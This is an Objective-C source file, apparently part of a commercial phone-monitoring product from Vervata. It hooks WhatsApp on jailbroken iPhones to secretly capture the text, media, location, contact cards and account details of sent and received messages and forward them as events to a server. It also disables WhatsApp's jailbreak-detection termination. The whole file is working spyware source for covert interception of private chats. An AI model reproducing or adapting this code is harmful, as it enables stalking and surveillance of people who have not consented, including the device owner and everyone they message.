/**
 - Project name :  MSFSP
 - Class name   :  WhatsApp
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  27/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import "MSFSP.h"
#import "XMPPStream.h"
#import "XMPPStream+2-12-3.h"
#import "XMPPConnection.h"
#import "XMPPConnection+2-12-3.h"
#import "XMPPMessageStanza.h"
#import "XMPPMessageStanza+2-11-9.h"
#import "XMPPMessageStanza+2-12-3.h"
#import "WhatsAppUtils.h"
#import "WhatsAppAccountInfo.h"
#import "WhatsAppMediaObject.h"				// for capture WhatsApp photo attachment
#import "WhatsAppMediaUtils.h"				// for capture WhatsApp photo attachment
#import "WAChatStorage.h"					// for capture WhatsApp photo attachment
#import "WAChatStorage+2-12-5.h"
#import "WAMessage.h"						// for capture WhatsApp photo attachment
#import "WAMessage+2-12-5.h"
#import "WAMediaUploader.h"

#import "XMPPPresenceStanza.h"

#import "WASharedAppData.h"

#import "XMPPStanzaElement.h"
#import "XMPPStanzaElement+2-11-9.h"
#import "XMPPStanzaElement+2-16-2.h"

// 2.16.6
#import "WAMediaCipher.h"

#import <UIKit/UIKit.h>
#import <CoreGraphics/CoreGraphics.h>
#import <objc/runtime.h>

#pragma mark -
#pragma mark Outgoing
#pragma mark version: EARIER than 2.8.2


void printWhatsAppLog (XMPPMessageStanza *aMessage);


/*****************************************************************************************
 * Description	- Send WhatsApp message (for WhatsApp version: eailier than 2.8.2)
 * Class		- XMPPStream
 * Method		- send:
 * Argument		- (XMPPStanzaMessage *) arg1
 * Return		- void
 ****************************************************************************************/
HOOK(XMPPStream, send$, void, id arg) { 
	DLog (@"=================================================")
	DLog(@"CAPTURE: Capturing XMPPStream =====> send (v 2.10.1)");
	DLog (@"=================================================")
	
	CALL_ORIG(XMPPStream, send$, arg);
	
	WhatsAppAccountInfo *waAccInfo = [WhatsAppAccountInfo shareWhatsAppAccountInfo];
	if ([arg isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
		DLog(@"Capturing XMPPStream =====> sending....");
		WhatsAppUtils *wUtils = [[[WhatsAppUtils alloc]init]autorelease];
		
		DLog(@"Capturing XMPPStream =====> user name = %@, [self xmppUser] = %@", 
			 [waAccInfo mUserName],			// e.g, 4s 
			 [self xmppUser]);				// e.g, 66867851331
		
		NSDictionary *accountInfo = [wUtils accountInfo:[self xmppUser]			
											   userName:[waAccInfo mUserName]];			// create a dictionary with two pair (user id and username)
		[wUtils setMAccountInfo:accountInfo];
		
		/*****************************************************************************
			Note: This is commented because we will use the code that use operation.
		 *****************************************************************************/
		//[wUtils createOutgoingWhatsAppEvent:arg];				
		if ([wUtils shouldProcess:arg]) {
            if ([(XMPPMessageStanza *)arg respondsToSelector:@selector(hasMedia)]) {
                // Version below 2.11.9
                [wUtils createOutgoingWhatsAppEvent:arg];
            } else {
                // Version from 2.11.9
                [wUtils performSelectorOnMainThread:@selector(createOutgoingWhatsAppEvent:)
                                         withObject:arg
                                      waitUntilDone:NO];
            }
		} else {
			DLog (@"This message will not be processed")
		}
	}
	else if ([arg isMemberOfClass:objc_getClass("XMPPPresenceStanza")]) {
		if([[(XMPPPresenceStanza *)arg attributes] objectForKey:@"name"]) {
			[waAccInfo setMUserName:(NSString *)[[(XMPPPresenceStanza *)arg attributes] objectForKey:@"name"]];
			DLog(@"Capturing XMPPMessageStanza =====> User Name:%@", [waAccInfo mUserName]);
		}
	}
	else {
		DLog(@"Capturing XMPPMessageStanza =====> Argument:%@",arg);
	}
}


#pragma mark version 2.8.2, 2.8.3, 2.8.4, 2.8.6 and 2.8.7

void printWhatsAppLog (XMPPMessageStanza *aMessage) {
    @try {
        DLog(@"text %@",                [aMessage text]);
        DLog(@"media %@",				[aMessage media])
        DLog(@"locationName %@",		[aMessage locationName])
        DLog(@"locationLongitude %@",	[aMessage locationLongitude])
        DLog(@"locationLatitude %@",	[aMessage locationLatitude])
        
        DLog(@"vCardContactName %@",	[aMessage vCardContactName])
        DLog(@"vCardStringValue %@",	[aMessage vCardStringValue])
        DLog(@"thumbnailData %@",		[aMessage thumbnailData])
        DLog(@"mediaDuration %d",		[aMessage mediaDuration])
        DLog(@"mediaName %@",			[aMessage mediaName])
        DLog(@"mediaURL %@",			[aMessage mediaURL])
        if ([aMessage respondsToSelector:@selector(hasMedia)]) {
            DLog(@"hasMedia %d",			[aMessage hasMedia])
        }
        if ([aMessage respondsToSelector:@selector(hasBody)]) {
            DLog(@"hasBody %d",				[aMessage hasBody])
        }
        if ([aMessage respondsToSelector:@selector(mediaType)]) { // < 2.16.x
            DLog(@"mediaType %d",			[aMessage mediaType])
        }
        DLog(@"media [%@] %@",			[[aMessage media] class], [aMessage media])	// XMPPStanzaElement
        DLog(@"media allAttributes %@",	[[aMessage media] allAttributes])
        DLog(@"media value %@",			[[aMessage media] value])
        DLog(@"name %@",				[[aMessage media] name])
        DLog(@"attributes %@",			[(XMPPStanzaElement *)[aMessage media] attributes])
        DLog(@"body [%@] %@",			[[aMessage body] class], [aMessage body])
        DLog(@"vcard [%@] %@",			[[aMessage vcard] class], [aMessage vcard])
        if ([aMessage respondsToSelector:@selector(allAttributes)]) {
            DLog(@"allAttributes %@", [aMessage allAttributes]);
        }
        if ([aMessage respondsToSelector:@selector(attributes)]) {
            DLog(@"attributes %@", [aMessage attributes]);
        }
        if ([aMessage respondsToSelector:@selector(children)]) {
            DLog(@"children %@", [aMessage children]);
            for (XMPPStanzaElement *child in [aMessage children]) {
                DLog(@"child [%@], %@", [child class], child);
                if ([child respondsToSelector:@selector(allAttributes)]) {
                    DLog(@"allAttributes %@", [child allAttributes]);
                }
                if ([child respondsToSelector:@selector(attributes)]) {
                    DLog(@"attributes %@", [child attributes]);
                }
            }
        }
    }
    @catch (NSException *exception) {
        DLog(@"WhatsApp log exception: %@", exception);
    }
    @finally {
        ;
    }
}

/*****************************************************************************************
 * Description		- Send WhatsApp message (for WhatsApp version 2.8.2, 2.8.3)
 * Class			- XMPPStream
 * Method			- send:encrypted:
 * Argument			- (XMPPStanzaMessage *) arg1
 * Return			- void
 ****************************************************************************************/
HOOK(XMPPStream, send$encrypted$, void, id arg1, BOOL arg2) { 
	DLog (@"=================================================")
	DLog (@"================  WhatsApp Sending =====================")
	DLog (@"=================================================")	

	//DLog(@"CAPTURE: Capturing XMPPStream =====> send:encrypted");
	CALL_ORIG(XMPPStream, send$encrypted$, arg1, arg2);
	DLog (@"arg1 %@", arg1)
	DLog (@"arg1 %@", [arg1 class])
	
	WhatsAppAccountInfo *waAccInfo = [WhatsAppAccountInfo shareWhatsAppAccountInfo];
	
	if ([arg1 isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
		DLog(@"Capturing XMPPStream =====>sending....");		
		WhatsAppUtils *wUtils = [[[WhatsAppUtils alloc] init] autorelease];

		DLog(@"Capturing XMPPStream =====> user name = %@, [self xmppUser] = %@", 
			 [waAccInfo mUserName],			// e.g, 4s 
			 [self xmppUser]);				// e.g, 66867851331
		
		printWhatsAppLog(arg1);
		
		NSDictionary *accountInfo = [wUtils accountInfo:[self xmppUser]			
											   userName:[waAccInfo mUserName]];			// create a dictionary with two pair (user id and username)
		[wUtils setMAccountInfo:accountInfo];
		[wUtils createOutgoingWhatsAppEvent:arg1];
	}
	else if ([arg1 isMemberOfClass:objc_getClass("XMPPPresenceStanza")]) {
		if([[(XMPPPresenceStanza *)arg1 attributes] objectForKey:@"name"]) {				// name of the account in WhatsApp application
			[waAccInfo setMUserName:(NSString *)[[(XMPPPresenceStanza *)arg1 attributes] objectForKey:@"name"]];
			DLog(@"Capturing XMPPMessageStanza =====>User Name:%@", [waAccInfo mUserName]);
		}
	} else {
		DLog(@"Capturing XMPPMessageStanza =====> Argument:%@",arg1);
	}
	
	DLog (@"============ END send and encrypt =============")
}


/*****************************************************************************************
 * Description		- Send image (for WhatsApp version 2.8.7, for OUTGOING image only)
					This method is not called in WhatsApp 2.10.2
 * Class			- WAChatStorage
 * Method			- messageWithImage:inChatSession:saveToLibrary:error:
 * Argument			- id image (UIImage *), id chatSession,  BOOL library, id* error
 * Return			- id (WAMessage *)
 ****************************************************************************************/
HOOK(WAChatStorage, messageWithImage$inChatSession$saveToLibrary$error$, id, id image, id chatSession, BOOL library, id* error) { 
	DLog (@"=================================================")
	DLog (@"================  WhatsApp IMAGE below or equal v 2.8.7 =====================")
	DLog (@"=================================================")	
		
	WAMessage *waMessage				= CALL_ORIG(WAChatStorage,messageWithImage$inChatSession$saveToLibrary$error$, image, chatSession, library, error);				
	
	WhatsAppMediaObject *mediaObject	= [[WhatsAppMediaObject alloc] init];
	[mediaObject setMImage:image];							//	UIImage
	[mediaObject setMMessageID:[waMessage stanzaID]];
	[[WhatsAppMediaUtils shareWhatsAppMediaUtils] addMediaObject:mediaObject];
	
	//NSData *thumbnailData				= [self thumbnailDataForMessage:waMessage];	
	//[mediaObject setMThumbnailData:thumbnailData];
		
	[mediaObject release];
	mediaObject = nil;
		
	DLog (@"IMAGE message id of image: %@", [waMessage stanzaID])	
	DLog (@"IMAGE ============ CALL ORGI, before return")	
	return waMessage;
}

/*****************************************************************************************
 * Description		- Send Video (for WhatsApp version 2.8.7)
					This method is not called in WhastApp 2.11.3
 * Class			- WAChatStorage
 * Method			- messageWithMovieURL:inChatSession:copyFile:error:
 * Argument			- id url, id chatSession,  BOOL copyFile, id* error
 * Return			- id (WAMessage *)
 ****************************************************************************************/
HOOK(WAChatStorage, messageWithMovieURL$inChatSession$copyFile$error$, id, id url, id chatSession, BOOL arg3, id* error) { 
	DLog (@"=================================================")
	DLog (@"================  WhatsApp MOVIE =====================")
	DLog (@"=================================================")	
	
	WAMessage *waMessage				= CALL_ORIG(WAChatStorage, messageWithMovieURL$inChatSession$copyFile$error$, url, chatSession, arg3, error);		
	
	WhatsAppMediaObject *mediaObject	= [[WhatsAppMediaObject alloc] init];
	[mediaObject setMMessageID:[waMessage stanzaID]];
	[mediaObject setMVideoAudioUrl:(NSURL*) url];
	[[WhatsAppMediaUtils shareWhatsAppMediaUtils] addMediaObject:mediaObject];
	[mediaObject release];
	mediaObject = nil;
	
	DLog (@"MOVIE url: [%@] %@", [url class], url)	
	DLog (@"MOVIE chatSession: %@", chatSession)	
	DLog (@"MOVIE copyFile: %d", arg3)		
	DLog (@"MOVIE message id of image: %@", [waMessage stanzaID])		
	
	return waMessage;
}


/*****************************************************************************************
 * Description		- Send Video (for WhatsApp version 2.11.5)
 * Class			- WAMediaUploader
 * Method			- uploadVideoFileAt:from:
 * Argument			- NSString *url, int
 * Return			- void
 ****************************************************************************************/
HOOK(WAMediaUploader, uploadVideoFileAt$from$, void, id arg1, int arg2) { 
	DLog (@"=================================================")
	DLog (@"================   WhatsApp MOVIE  2.11.5 =====================")
	DLog (@"=================================================")	
	
	CALL_ORIG(WAMediaUploader,uploadVideoFileAt$from$, arg1, arg2);		

	DLog (@"Debug arg1 %@ %@", arg1, [arg1 class])
	DLog (@"Debug arg2 %d", arg2)	
	DLog (@"mediaPath %@", [self mediaPath])
	DLog (@"mediaURL %@", [self mediaURL])
	
	NSURL *url							= [NSURL fileURLWithPath:arg1];
	WAMessage *waMessage				= [self message];	
	WhatsAppMediaObject *mediaObject	= [[WhatsAppMediaObject alloc] init];
	[mediaObject setMMessageID:[waMessage stanzaID]];
	[mediaObject setMVideoAudioUrl:url];	
	[[WhatsAppMediaUtils shareWhatsAppMediaUtils] addMediaObject:mediaObject];	
	[mediaObject release];
	mediaObject = nil;
	DLog (@"MOVIE message id of image: %@", [[self message] stanzaID])
}

/*****************************************************************************************
 * Description		- Send Audio (for WhatsApp version 2.8.7)
 * Class			- WAChatStorage
 * Method			- messageWithAudioURL$inChatSession$error$
 * Argument			- 
 * Return			- 
 ****************************************************************************************/
HOOK(WAChatStorage, messageWithAudioURL$inChatSession$error$, id, id audioURL, id chatSession, id* error) { 
	DLog (@"=================================================")
	DLog (@"================  WhatsApp AUDIO =====================")
	DLog (@"=================================================")				

	WAMessage *waMessage				= CALL_ORIG(WAChatStorage, messageWithAudioURL$inChatSession$error$, audioURL, chatSession, error);		
	
	// e.g., /var/mobile/Applications/E00BD4E9-CA3C-424B-9E12-BCE9EF3ACA56/Library/Media/66850981119@s.whatsapp.net/c/5/c5d07585d16c7c2d4f39613c7ed0d5d5.caf
    NSString *audioFullPath				= [self fullPathToMediaInMessage:waMessage];
	DLog (@"fullPathToMediaInMessage: %@", audioFullPath)

	WhatsAppMediaObject *mediaObject	= [[WhatsAppMediaObject alloc] init];
	[mediaObject setMMessageID:[waMessage stanzaID]];
	[mediaObject setMVideoAudioUrl:[[[NSURL alloc] initWithString:audioFullPath] autorelease]];
	
	[[WhatsAppMediaUtils shareWhatsAppMediaUtils] addMediaObject:mediaObject];
	[mediaObject release];
	mediaObject = nil;
	
	DLog (@"AUDIO url: [%@] %@", [audioURL class], audioURL)		// Cannot be used, it point to somewhere else
	DLog (@"AUDIO chatSession: %@", chatSession)		
	DLog (@"AUDIO message id of image: %@", [waMessage stanzaID])
	
	return waMessage;
}

/*****************************************************************************************
 * Description		- Utility for keep audio information
 * Class			- None
 * Method			- processAudioMessage
 * Argument			- WAChatStorage, WAMessage
 * Return			- void
 ****************************************************************************************/
void processAudioMessage (WAChatStorage *selfChatStorage, WAMessage *returnWaMessage) { 	
	// e.g., /var/mobile/Applications/E00BD4E9-CA3C-424B-9E12-BCE9EF3ACA56/Library/Media/66850981119@s.whatsapp.net/c/5/c5d07585d16c7c2d4f39613c7ed0d5d5.caf
    NSString *audioFullPath				= nil;
    if ([selfChatStorage respondsToSelector:@selector(fullPathToMediaInMessage:)]) {
        audioFullPath = [selfChatStorage fullPathToMediaInMessage:returnWaMessage];
    } else {
        // 2.12.5
        audioFullPath = [selfChatStorage libraryPathToMediaItemWithHash:[returnWaMessage fileHash]];
        
        NSString *libraryPath = [NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES) objectAtIndex:0];
        DLog(@"libraryPath, %@", libraryPath);
        
        audioFullPath = [libraryPath stringByAppendingFormat:@"/%@", audioFullPath];
    }
	
	DLog (@"fullPathToMediaInMessage: %@", audioFullPath)
	
	WhatsAppMediaObject *mediaObject	= [[WhatsAppMediaObject alloc] init];
	[mediaObject setMMessageID:[returnWaMessage stanzaID]];
	[mediaObject setMVideoAudioUrl:[[[NSURL alloc] initWithString:audioFullPath] autorelease]];
	
	[[WhatsAppMediaUtils shareWhatsAppMediaUtils] addMediaObject:mediaObject];
	[mediaObject release];
	mediaObject = nil;
	
	DLog (@"AUDIO message id of image: %@", [returnWaMessage stanzaID])
}

/*****************************************************************************************
 * Description		- Send Audio (for WhatsApp version 2.10.1)
 * Class			- WAChatStorage
 * Method			- messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$error$
 * Argument			- 
 * Return			- 
 ****************************************************************************************/
HOOK(WAChatStorage, messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$error$, id, id audioURL,  id chatSession, int origin, int seconds, BOOL upload, id* error) { 
	DLog (@"=================================================")
	DLog (@"================  WhatsApp AUDIO v 2.10.1 =====================")
	DLog (@"=================================================")				
	
	WAMessage *waMessage				= CALL_ORIG(WAChatStorage, messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$error$, audioURL, chatSession, origin, seconds, upload, error);		
	
	processAudioMessage(self, waMessage);
		
	DLog (@"AUDIO url: [%@] %@", [audioURL class], audioURL)		// Cannot be used, it point to somewhere else
	DLog (@"AUDIO chatSession: %@", chatSession)	
	return waMessage;
}

/*****************************************************************************************
 * Description		- Send Audio (for WhatsApp version 2.11.5)
 * Class			- WAChatStorage
 * Method			- messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$error$
 * Argument			- 
 * Return			- 
 ****************************************************************************************/
HOOK(WAChatStorage, messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$streaming$streamingHash$error$, id, 
	 id audioURL,  id chatSession, int origin, int seconds, BOOL upload, BOOL streaming, id streamHash , id* error) { 
	DLog (@"=================================================")
	DLog (@"================  WhatsApp AUDIO v 2.11.5  =====================")
	DLog (@"=================================================")				
	
	WAMessage *waMessage				= CALL_ORIG(WAChatStorage, messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$streaming$streamingHash$error$, 
													audioURL, chatSession, origin, seconds, upload, streaming, streamHash, error);		
		
	processAudioMessage(self, waMessage);
	
	DLog (@"AUDIO url: [%@] %@", [audioURL class], audioURL)		// Cannot be used, it point to somewhere else
	DLog (@"AUDIO chatSession: %@", chatSession)				
	return waMessage;
}

#pragma mark version 2.12.3,2.12.10,2.12.14

//HOOK(XMPPStream, sendElements$, unsigned int, id  arg1) {
//    DLog (@"XMPPStream =====> sendElements$")
//    DLog (@"arg1 %@",arg1)
//    DLog (@"arg1 class %@",[arg1 class])
//    return CALL_ORIG(XMPPStream, sendElements$, arg1);
//}
//
//HOOK(XMPPStream, sendElements$timeout$, unsigned int, id arg1, double arg2) {
//    DLog (@"XMPPStream =====> sendElements$timeout$")
//    DLog (@"arg1 %@",arg1)
//    DLog (@"arg1 class %@",[arg1 class])
//    DLog (@"arg2 %f", arg2)
//    return CALL_ORIG(XMPPStream, sendElements$timeout$, arg1, arg2);
//}

HOOK(XMPPStream, sendElement$, unsigned int, id arg1) {
    DLog (@"XMPPStream =====> sendElement$")
    DLog (@"arg1 %@",arg1)
    DLog (@"arg1 class %@",[arg1 class])
    
    unsigned int ret = CALL_ORIG(XMPPStream, sendElement$, arg1);
    
    @try {
        dispatch_async(dispatch_get_main_queue(), ^(void) {
            @try {
                WhatsAppAccountInfo *waAccInfo = [WhatsAppAccountInfo shareWhatsAppAccountInfo];
                
                if ([arg1 isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
                    DLog(@"Capturing XMPPStream =====>sending....");
                    WhatsAppUtils *wUtils = [[[WhatsAppUtils alloc] init] autorelease];
                    
                    DLog(@"Capturing XMPPStream =====> user name = %@, [self xmppUser] = %@",
                         [waAccInfo mUserName],			// e.g, 4s
                         [self xmppUser]);				// e.g, 66867851331
                    
                    printWhatsAppLog(arg1);
                    
                    NSDictionary *accountInfo = [wUtils accountInfo:[self xmppUser]
                                                           userName:[waAccInfo mUserName]];			// create a dictionary with two pair (user id and username)
                    [wUtils setMAccountInfo:accountInfo];
                    [wUtils createOutgoingWhatsAppEvent:arg1];
                }
                else if ([arg1 isMemberOfClass:objc_getClass("XMPPPresenceStanza")]) {
                    if([[(XMPPPresenceStanza *)arg1 attributes] objectForKey:@"name"]) {				// name of the account in WhatsApp application
                        [waAccInfo setMUserName:(NSString *)[[(XMPPPresenceStanza *)arg1 attributes] objectForKey:@"name"]];
                        DLog(@"Capturing XMPPMessageStanza =====>User Name:%@", [waAccInfo mUserName]);
                    }
                }
            }
            @catch (NSException *exception) {
                DLog(@"WhatsApp block exception: %@", exception);
            }
            @finally {
                ;
            }
        });
    }
    @catch (NSException *exception) {
        DLog(@"WhatsApp exception: %@", exception);
    }
    @finally {
        ;
    }
    
    DLog (@"============ END sendElement$ =============")
    
    return (ret);
}

//HOOK(XMPPStream, sendElement$timeout$, unsigned int, id arg1, double arg2) {
//    DLog (@"XMPPStream =====> sendElement$timeout$")
//    DLog (@"arg1 %@",arg1)
//    DLog (@"arg1 class %@",[arg1 class])
//    DLog (@"arg2 %f", arg2)
//    return CALL_ORIG(XMPPStream, sendElement$timeout$, arg1, arg2);
//}

#pragma mark -
#pragma mark Incoming
#pragma mark version: earlier than 2.8.2, 2.8.3


/*****************************************************************************************
 * Description	- Recieve WhatsApp message (for WhatsApp version: eailier than 2.8.2, 2.8.2, 2.8.3, 2.12.5 {Nokia C7-00})
 * Class			- XMPPConnection
 * Method		- processIncomingMessages:
 * Argument		- (XMPPStanzaArray *) arg1
 * Return		- void
 *******************************************************************************************/
HOOK(XMPPConnection, processIncomingMessages$, void, id arg) { 
	DLog(@"CAPTURE: Capturing XMPPConnection =====> processIncomingMessages")
	DLog (@"arg %@",arg)
	DLog (@"arg class %@",[arg class])
	
	CALL_ORIG(XMPPConnection, processIncomingMessages$, arg);
	
    @try {
        WhatsAppUtils *wUtils = [WhatsAppUtils sharedWhatsAppUtils];
        
        NSString *xmppUser = nil;
        if ([self respondsToSelector:@selector(xmppUser)]) {
            xmppUser = [self xmppUser];
        } else {
            // 2.12.5 (Why come back here? send from my Nokia C7-00)
            XMPPStream *_stream = nil;
            object_getInstanceVariable(self, "_stream", (void **)&_stream);
            xmppUser = [_stream xmppUser];
            DLog (@"xmppUser= %@", xmppUser);
        }
        
        NSDictionary *accountInfo = [wUtils accountInfo:xmppUser
                                               userName:[[WhatsAppAccountInfo shareWhatsAppAccountInfo] mUserName]];
        [wUtils setMAccountInfo:accountInfo];
        
        //	id incomingParts = [wUtils incomingMessageParts:arg];
        DLog (@"Thread to capture incoming ==> %@", [NSThread currentThread])
        // -- send event to the server
        for (XMPPMessageStanza *eachMessage in arg) {
            DLog (@"eachMessage ==> %@", eachMessage)
            // 2.16.10 Back to here again and need to change to run in main thread
            // No UI freeze
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                [wUtils createIncomingWhatsAppEvent:eachMessage];
            });
        }
    }
    @catch (NSException *exception) {
        DLog(@"WhatsApp exception: %@", exception);
    }
    @finally {
        ;
    }
}

// This is obsoleted since WhatsApp 2.12.1. Use processIncomingMessageStanzas2_12_1 instead
HOOK(XMPPConnection, processIncomingMessageStanzas$, void, id arg) { 
	DLog (@"==================================================================")
	DLog(@"CAPTURE: Capturing XMPPConnection =====> processIncomingMessageStanzas (WhatsApp v 2.11.3)")
	DLog (@"==================================================================")
	DLog (@"arg %@",arg)
	DLog (@"arg class %@",[arg class])
	
	CALL_ORIG(XMPPConnection, processIncomingMessageStanzas$, arg);
	
    @try {
        WhatsAppUtils *wUtils = [[[WhatsAppUtils alloc] init] autorelease];
        
        NSDictionary *accountInfo = [wUtils accountInfo:[self xmppUser]
                                               userName:[[WhatsAppAccountInfo shareWhatsAppAccountInfo] mUserName]];
        [wUtils setMAccountInfo:accountInfo];
        
        //	id incomingParts = [wUtils incomingMessageParts:arg];
        //DLog (@"Thread to capture incoming ==> %@", [NSThread currentThread])
        // -- send event to the server
        for (XMPPMessageStanza *eachMessage in arg) {
            [wUtils performSelector:@selector(createIncomingWhatsAppEvent:)
                         withObject:eachMessage
                         afterDelay:5.0];
            
        }
    }
    @catch (NSException *exception) {
        DLog(@"WhatsApp exception: %@", exception);
    }
    @finally {
        ;
    }
}

// For WhatsApp 2.12.1, 2.12.3, 2.12.10
HOOK(XMPPConnection, processIncomingMessageStanzas2_12_1$, id, id arg) {
	DLog (@"==================================================================")
	DLog (@"CAPTURE: Capturing XMPPConnection =====> processIncomingMessageStanzas2_12_1 (WhatsApp v 2.12.1)")
	DLog (@"==================================================================")
	DLog (@"arg %@",arg)
	DLog (@"arg class %@",[arg class])
	
	id ret  = CALL_ORIG(XMPPConnection, processIncomingMessageStanzas2_12_1$, arg);
	
    @try {
        WhatsAppUtils *wUtils = [[[WhatsAppUtils alloc] init] autorelease];
        
        NSString *xmppUser = nil;
        if ([self respondsToSelector:@selector(xmppUser)]) {
            xmppUser = [self xmppUser];
        } else {
            // 2.12.3
            XMPPStream *_stream = nil;
            object_getInstanceVariable(self, "_stream", (void **)&_stream);
            xmppUser = [_stream xmppUser];
            DLog (@"xmppUser= %@", xmppUser);
        }
        
        NSDictionary *accountInfo = [wUtils accountInfo:xmppUser
                                               userName:[[WhatsAppAccountInfo shareWhatsAppAccountInfo] mUserName]];
        [wUtils setMAccountInfo:accountInfo];
        
        //	id incomingParts = [wUtils incomingMessageParts:arg];
        //DLog (@"Thread to capture incoming ==> %@", [NSThread currentThread])
        // -- send event to the server
        for (XMPPMessageStanza *eachMessage in arg) {
            [wUtils performSelector:@selector(createIncomingWhatsAppEvent:)
                         withObject:eachMessage
                         afterDelay:5.0];
            
        }
    }
    @catch (NSException *exception) {
        DLog(@"WhatsApp exception: %@", exception);
    }
    @finally {
        ;
    }
    
    return ret;
}


HOOK(WASharedAppData, showLocalNotificationForJailbrokenPhoneAndTerminate, void ){
	DLog (@"=================================================")
	DLog (@"================  showLocalNotificationForJailbrokenPhoneAndTerminate =====================")
	DLog (@"=================================================")
    //CALL_ORIG(WASharedAppData, showLocalNotificationForJailbrokenPhoneAndTerminate);
}

#pragma mark - DEBUGGING -

HOOK(WAMediaCipher, initWithKey$mediaType$, id, id arg1, int arg2) {
    DLog (@"=================================================")
    DLog (@"===========  initWithKey$mediaType$ ============")
    DLog (@"=================================================")
    DLog (@"arg1 %@", arg1)
    DLog (@"arg2 %d", arg2)
    
    return CALL_ORIG(WAMediaCipher, initWithKey$mediaType$, arg1, arg2);
}

HOOK(WAMediaCipher, decryptFileAtURL$toURL$, _Bool, id arg1, id arg2) {
	DLog (@"=================================================")
	DLog (@"===========  decryptFileAtURL$toURL$ ============")
	DLog (@"=================================================")	
	DLog (@"arg1 %@", arg1)
    DLog (@"arg2 %@", arg2)
	
	return CALL_ORIG(WAMediaCipher, decryptFileAtURL$toURL$, arg1, arg2);
}
